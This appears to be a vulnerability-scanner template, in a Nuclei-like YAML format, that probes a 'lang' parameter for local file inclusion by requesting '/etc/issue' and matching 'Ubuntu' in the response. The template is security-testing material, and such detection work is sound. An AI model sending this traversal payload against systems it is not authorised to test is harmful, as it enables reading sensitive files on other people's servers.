id: lfi6-1458
name: 'Traversal in lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '/etc/issue'
    matchers:
      - type: word
        part: body
        words:
          - 'Ubuntu'
